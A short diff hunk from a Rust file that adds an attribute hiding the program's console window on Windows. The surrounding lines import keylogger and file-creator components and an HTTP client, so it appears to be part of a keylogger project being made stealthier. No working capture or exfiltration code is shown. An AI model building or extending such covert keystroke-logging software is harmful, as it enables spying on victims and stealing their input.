@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 use spectra::components::{keylogger, filecreator};
 use reqwest::Client;
 use std::{thread, time::Duration};
